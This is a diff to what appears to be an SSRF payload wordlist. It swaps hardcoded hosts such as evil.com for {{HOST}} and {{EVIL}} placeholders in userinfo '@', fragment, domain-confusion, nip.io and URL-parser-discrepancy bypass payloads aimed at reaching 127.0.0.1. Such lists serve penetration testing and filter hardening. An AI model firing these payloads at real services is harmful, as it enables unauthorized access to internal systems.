@@ -90,20 +90,19 @@ http://127.0.0.1/%2561dmin
 http://127%2e0%2e0%2e1
 http://127.0.0.1%2f%2e%2e
 
-# ---------- Userinfo "@" trick ----------
-http://{{LHOST}}@127.0.0.1
-http://expected-host.com@127.0.0.1
-http://expected-host.com@127.0.0.1@evil.com
+# ---------- Userinfo "@" trick (reach 127.0.0.1, parser decoy = whitelisted {{HOST}}) ----------
+http://{{HOST}}@127.0.0.1
+http://127.0.0.1#@{{HOST}}
+http://{{HOST}}#@127.0.0.1
+http://{{HOST}}@127.0.0.1@{{HOST}}
 http://127.1.1.1@127.2.2.2
-http://127.0.0.1#@evil.com
-http://evil.com#@127.0.0.1
 
-# ---------- Domain confusion (Contains-based filters) ----------
-http://expected-host.com.{{LHOST}}
-http://{{LHOST}}/expected-host.com
-http://{{LHOST}}#expected-host.com
-http://{{LHOST}}?expected-host.com
-http://expected-host.com.127.0.0.1.nip.io
+# ---------- Domain confusion for Contains-filters (reach {{EVIL}}, carry {{HOST}}) ----------
+http://{{HOST}}.{{EVIL}}
+http://{{EVIL}}/{{HOST}}
+http://{{EVIL}}#{{HOST}}
+http://{{EVIL}}?{{HOST}}
+http://{{HOST}}.127.0.0.1.nip.io
 
 # ---------- URL parser discrepancy (Orange Tsai) ----------
 http://127.1.1.1:80\@127.2.2.2:80/
